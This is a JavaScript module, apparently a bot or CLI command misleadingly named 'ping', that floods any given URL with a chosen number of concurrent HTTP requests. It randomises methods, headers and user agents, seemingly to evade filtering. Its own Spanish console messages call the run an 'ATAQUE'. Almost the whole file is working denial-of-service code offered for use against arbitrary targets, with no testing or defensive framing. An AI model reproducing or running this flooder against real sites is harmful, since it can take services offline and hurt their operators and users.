import http from 'http';
import https from 'https';
import chalk from 'chalk';

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
  'Mozilla/5.0 (X11; Linux x86_64)',
  'curl/7.68.0',
  'Wget/1.21.1 (linux-gnu)',
  'PostmanRuntime/7.29.2',
  'Mozilla/5.0 (Linux; Android 12)',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)',
  'python-requests/2.25.1',
  'Java/1.8.0_261',
];

const methods = ['GET', 'POST', 'HEAD', 'OPTIONS'];
const headersList = [
  { 'Accept-Language': 'en-US,en;q=0.9' },
  { 'Cache-Control': 'no-cache' },
  { 'Pragma': 'no-cache' },
  { 'X-Requested-With': 'XMLHttpRequest' },
  { 'DNT': '1' },
  { 'Upgrade-Insecure-Requests': '1' },
];

function random(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

export default {
  async run(args) {
    const [url, totalStr, concurrentStr] = args;

    if (!url || !totalStr || !concurrentStr) {
      console.log(chalk.red('❌ Uso correcto:\nping [URL] [TOTAL] [CONCURRENCIA]'));
      return;
    }

    const total = parseInt(totalStr);
    const concurrent = parseInt(concurrentStr);

    if (isNaN(total) || isNaN(concurrent) || total <= 0 || concurrent <= 0) {
      console.log(chalk.red('❌ Números inválidos.'));
      return;
    }

    const modulo = url.startsWith('https') ? https : http;
    let enviados = 0, exitosos = 0, fallidos = 0;

    console.log(chalk.yellow(`🚀 ATAQUE: ${total} pings a ${url} con ${concurrent} en paralelo\n`));

    const flood = async () => {
      while (enviados < total) {
        const bloque = [];

        for (let i = 0; i < concurrent && enviados < total; i++) {
          enviados++;

          bloque.push(new Promise(resolve => {
            const method = random(methods);
            const headers = {
              'User-Agent': random(userAgents),
              ...random(headersList),
            };

            try {
              const options = new URL(url);
              const req = modulo.request({
                hostname: options.hostname,
                port: options.port,
                path: options.pathname,
                method,
                headers,
              }, res => {
                res.on('data', () => {});
                res.on('end', () => { exitosos++; resolve(); });
              });

              req.on('error', () => { fallidos++; resolve(); });
              req.setTimeout(3000, () => { req.destroy(); fallidos++; resolve(); });
              req.end();
            } catch (err) {
              fallidos++;
              resolve();
            }
          }));
        }

        await Promise.all(bloque);
        process.stdout.write(chalk.gray(`\r📊 Enviados: ${enviados}/${total}   🟢 OK: ${exitosos}   🔴 Fails: ${fallidos}`));
      }

      console.log(chalk.green('\n✅ Ataque finalizado.'));
    };

    await flood();
  }
};
